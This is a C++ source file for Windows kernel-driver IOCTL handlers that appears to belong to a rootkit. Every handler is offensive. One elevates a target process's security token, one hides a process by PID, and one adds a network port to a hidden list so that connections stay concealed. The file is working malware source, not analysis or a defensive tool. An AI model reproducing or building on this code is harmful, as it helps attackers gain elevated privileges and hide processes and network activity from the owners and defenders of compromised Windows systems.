#include "IoctlHandlers.h"
#include "lib/Process.h"
#include "Capabilities/ProcessCapabilities/ProcessHider.h"
#include "Capabilities/TokenCapabilities/TokenElevator.h"
#include "NetworkHandler.h"
#include "Config.h"

NTSTATUS IoctlHandlers::ElevateToken(PIRP Irp) {
	auto status = STATUS_SUCCESS;
	const auto stack = IoGetCurrentIrpStackLocation(Irp);

	auto pid = reinterpret_cast<PULONG>(stack->Parameters.DeviceIoControl.Type3InputBuffer);

	if (pid == nullptr) {
		Irp->IoStatus.Information = 0;
		return STATUS_INVALID_PARAMETER;
	}

	auto process = Process(*pid);
	
	auto tokenElevator = TokenElevator(process);
	status = tokenElevator.elevate();

	Irp->IoStatus.Information = 0;
	Irp->IoStatus.Status = status;
	return status;
}

NTSTATUS IoctlHandlers::HideProcess(PIRP Irp) {
	auto status = STATUS_SUCCESS;
	const auto stack = IoGetCurrentIrpStackLocation(Irp);

	const auto pid = reinterpret_cast<PULONG>(stack->Parameters.DeviceIoControl.Type3InputBuffer);
	if (pid == nullptr) {
		Irp->IoStatus.Information = 0;
		return STATUS_INVALID_PARAMETER;
	}
	auto process = Process(*pid);
	auto processHider = ProcessHider(process);
	status = processHider.hide();
	Irp->IoStatus.Information = 0;
	Irp->IoStatus.Status = status;
	return status;
}

NTSTATUS  IoctlHandlers::HidePort(PIRP Irp) {
	auto status = STATUS_SUCCESS;
	const auto stack = IoGetCurrentIrpStackLocation(Irp);
	auto port = (USHORT*)stack->Parameters.DeviceIoControl.Type3InputBuffer;

	if (*port <= static_cast < USHORT>(0) || *port > static_cast <USHORT>(65535))
	{
		return STATUS_INVALID_PARAMETER;
	}

	//Add the desired port to the list of hidden ports.
	auto size = sizeof(NetworkHandler::HiddenPort);
	auto portToHide = (NetworkHandler::HiddenPort*)ExAllocatePoolWithTag(PagedPool, size, POOL_TAG);

	if (portToHide == nullptr)
	{
		status = STATUS_INSUFFICIENT_RESOURCES;
		goto ERROR;
	}
	
	portToHide->HiddenPort = NetworkHandler::htons(*port);
	NetworkHandler::addHiddenPort(&portToHide->Entry);

ERROR:
	Irp->IoStatus.Status = status;
	Irp->IoStatus.Information = 0;
	return status;
}